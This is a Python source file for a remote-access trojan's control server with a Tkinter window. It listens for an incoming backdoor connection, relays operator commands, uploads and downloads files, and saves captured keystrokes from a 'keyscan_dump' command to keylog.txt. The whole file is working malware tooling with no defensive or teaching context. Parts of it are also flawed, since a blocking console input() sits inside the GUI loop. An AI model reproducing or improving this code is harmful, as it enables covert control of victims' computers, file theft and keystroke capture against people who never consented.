import socket
import base64
import json
import tkinter as tk
from tkinter import messagebox
from tkinter import filedialog

class Listener:

    def __init__(self, ip, port):
        self.conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.conn.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.conn.bind((ip, port))
        self.conn.listen(0)
        print("[+] listener started on {} {}".format(ip, port))
        self.connection, address = self.conn.accept()
        print("[+] connection received from {}".format(address))
        self.address = address

    def send(self, data):
        json_data = json.dumps(data)
        try:
            self.connection.send(json_data.encode())
        except BrokenPipeError: 
            print("[-] Connection is broken")
            exit(0)

    def receive(self):
        json_result = ''
        while True:
            try:
                json_result += self.connection.recv(1024).decode()
                result = base64.b64decode(json.loads(json_result).encode()).decode()
                return result
            except ValueError:
                continue

    def download_file(self, data, path):
        with open(path, 'wb') as file:
            file.write(base64.b64decode(data))
            return "[+] file downloaded"

    def upload_file(self, path):
        try:
            with open(path, 'rb') as file:
                return base64.b64encode(file.read())
        except:
            return b"[-] file not found"

class ListenerGUI:
    def __init__(self, master):
        self.master = master
        master.title("Listener GUI")
        
        self.label = tk.Label(master, text="Enter IP and Port:")
        self.label.pack()
        
        self.ip_entry = tk.Entry(master)
        self.ip_entry.pack()
        
        self.port_entry = tk.Entry(master)
        self.port_entry.pack()

        self.connect_button = tk.Button(master, text="Connect", command=self.connect)
        self.connect_button.pack()

        self.terminal = tk.Text(master, height=20, width=50, state=tk.DISABLED)
        self.terminal.pack()

    def connect(self):
        ip = self.ip_entry.get()
        port = int(self.port_entry.get())
        try:
            self.listener = Listener(ip, port)
            self.display_message("[+] listener started on {} {}".format(ip, port))
            self.display_message("[+] connection received from {}".format(self.listener.address))
        except Exception as e:
            messagebox.showerror("Error", str(e))
            return
        
        while True:
            try:
                data = input(">> ")
                if data.split(' ')[0] == 'upload':
                    filename = filedialog.askopenfilename()
                    with open(filename, 'rb') as file:
                        content = base64.b64encode(file.read()).decode()
                    data = data + ' ' + content
                self.listener.send(data)
                result = self.listener.receive()
                if data.split(' ')[0] == 'download':
                    filename = filedialog.asksaveasfilename(defaultextension=".txt")
                    with open(filename, 'wb') as file:
                        file.write(base64.b64decode(result))
                    result = "[+] File downloaded: {}".format(filename)
                if data.split(' ')[0] == 'keyscan_dump':
                    with open('keylog.txt', 'wb') as file:
                        file.write(base64.b64decode(result))
                    result = "[+] Keystrokes dumped to keylog.txt"
                self.display_message(result)
            except KeyboardInterrupt:
                self.listener.send("exit")
                exit(0)

    def display_message(self, message):
        self.terminal.config(state=tk.NORMAL)
        self.terminal.insert(tk.END, message + "\n")
        self.terminal.config(state=tk.DISABLED)
        self.terminal.see(tk.END)


def main():
    root = tk.Tk()
    app = ListenerGUI(root)
    root.mainloop()


if __name__ == "__main__":
    main()
